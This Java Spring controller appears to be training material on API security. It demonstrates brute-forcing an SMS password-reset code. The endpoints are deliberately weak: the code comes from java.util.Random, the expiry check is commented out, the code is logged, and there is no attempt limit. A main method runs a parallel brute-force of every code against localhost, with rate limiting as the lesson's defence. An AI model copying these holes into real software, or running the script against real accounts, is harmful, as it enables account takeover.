package victor.training.spring.web.apisec;

import ch.qos.logback.classic.Level;
import io.github.resilience4j.ratelimiter.RequestNotPermitted;
import io.github.resilience4j.ratelimiter.annotation.RateLimiter;
import lombok.Value;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.HttpStatusCodeException;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import javax.annotation.security.PermitAll;
import java.time.LocalDateTime;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.IntStream;

@Slf4j
@RestController
public class BruteForce {
  private final Map<String, PasswordResetAttempt> passwordResetAttempts = Collections.synchronizedMap(new HashMap<>());

  @ExceptionHandler(RequestNotPermitted.class)
  @ResponseStatus(HttpStatus.TOO_MANY_REQUESTS)
  public void method() {
  }

  @PermitAll
  @GetMapping("user/{user}/reset-password-step1")
  public String resetPassword(@PathVariable String user) {
    Random random = new Random();
    int smsCode = random.nextInt(89999) + 10000;
    passwordResetAttempts.put(user, new PasswordResetAttempt(smsCode, LocalDateTime.now().plusMinutes(1)));
    System.out.println("Sending smsCode to victim: " + smsCode);
    return "SMS sent. Please check your phone";
  }

  @PermitAll
  @RateLimiter(name = "rateLimiterApi")
  @PostMapping("user/{user}/reset-password-step2")
  public ResponseEntity<String> resetStep2(@PathVariable String user, @RequestBody ResetStep2Request dto) {
    PasswordResetAttempt step1 = passwordResetAttempts.get(user);
    if (step1.smsCode != dto.smsCode)
//      throw new IllegalArgumentException("invalid code: " + dto.smsCode);
      return ResponseEntity.internalServerError().body("invalid code");
//    if (step1.attemptDeadline.isBefore(LocalDateTime.now()))
//       throw new IllegalArgumentException("Reset deadline expired");
//      return ResponseEntity.internalServerError().body("Reset deadline expired");
    log.info("Password successfully changed for user: " + user);
    return ResponseEntity.ok("success!");
  }

  @Value
  static class ResetStep2Request {
    int smsCode;
    String newPassword;
  }

  @Value
  static class PasswordResetAttempt {
    Integer smsCode;
    LocalDateTime attemptDeadline;
//    int attemptsLeft;
  }

  public static void main(String[] args) {
    setLoggingLevel(Level.INFO);
    AtomicInteger countDone = new AtomicInteger(0);
    AtomicInteger attemptsSucceeded = new AtomicInteger(0);
    RestTemplate rest = new RestTemplate();
    rest.getForObject("http://localhost:8080/user/victim/reset-password-step1", String.class);
    boolean r = IntStream.range(100_00, 1_000_00)
            .parallel()
            .peek(i -> {
              countDone.incrementAndGet();
              if(i%100 ==0) System.out.println(100f*countDone.get() / 90_000f);})
            .mapToObj(i -> {
              try {
                String s = rest.postForObject("http://localhost:8080/user/victim/reset-password-step2",
                        new ResetStep2Request(i, "hacked")
                        , String.class);
                System.out.println("Got "+s+". Successfully reset victim's password ");
                return true;
              } catch (RestClientException e) {
                if (e instanceof HttpStatusCodeException
                    && ((HttpStatusCodeException)e).getStatusCode()==HttpStatus.TOO_MANY_REQUESTS){
                  return  false; // blocked
                }
                attemptsSucceeded.incrementAndGet();
                return false;
              }
            })
            .anyMatch(e -> e);
    System.out.println("EXPERIMENT SUCESS: " + r);
    System.out.println("Attempts succeeded = " + attemptsSucceeded.get());
  }

  public static void setLoggingLevel(Level level) {
    ch.qos.logback.classic.Logger root = (ch.qos.logback.classic.Logger) org.slf4j.LoggerFactory.getLogger(ch.qos.logback.classic.Logger.ROOT_LOGGER_NAME);
    root.setLevel(level);
  }
}
